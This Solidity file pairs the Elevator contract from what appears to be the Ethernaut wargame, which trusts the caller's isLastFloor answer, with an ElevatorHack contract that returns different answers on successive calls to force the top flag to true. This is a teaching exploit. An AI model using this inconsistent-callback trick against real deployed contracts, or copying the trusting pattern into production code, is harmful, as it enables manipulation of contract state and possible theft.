// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

// Elevator Hack Contract
contract ElevatorHack {
    Elevator public immutable elevator;
    uint public count;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function attack() external {
        elevator.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1;
    }
}
